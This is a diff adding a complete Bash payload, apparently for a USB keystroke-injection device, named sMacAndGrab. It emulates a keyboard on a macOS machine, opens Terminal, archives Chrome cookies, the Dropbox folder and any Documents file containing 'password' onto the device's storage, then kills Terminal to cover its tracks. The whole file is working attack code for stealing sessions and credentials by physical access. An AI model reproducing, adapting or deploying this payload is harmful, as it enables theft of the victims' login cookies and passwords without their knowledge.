@@ -1,0 +1,39 @@
+#!/bin/bash
+#
+# Title:         sMacAndGrab
+# Author:        audibleblink
+# Target:      macOS
+# Version:       1.0
+#
+# Backup a list of files from macOS
+#
+# Yellow (blinking)...Attacking
+# Green...............Finished
+
+LED G R 500
+ATTACKMODE HID STORAGE
+
+mkdir -p /root/udisk/loot/sMacAndGrab
+
+# Unknown devices mount as NO NAME
+dev_name="NO NAME"
+lootdir="\"/Volumes/$dev_name/loot/sMacAndGrab\""
+
+# Add your files here
+files_to_copy=(
+"\"~/Library/Application Support/Google/Chrome/Default/Cookies\"" # Quote paths with spaces
+"~/Dropbox"
+"\$(grep -lr password ~/Documents)" # Escape the subshell to have this run on TARGET
+)
+
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 4000
+QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
+QUACK ENTER
+
+sync
+LED G
+
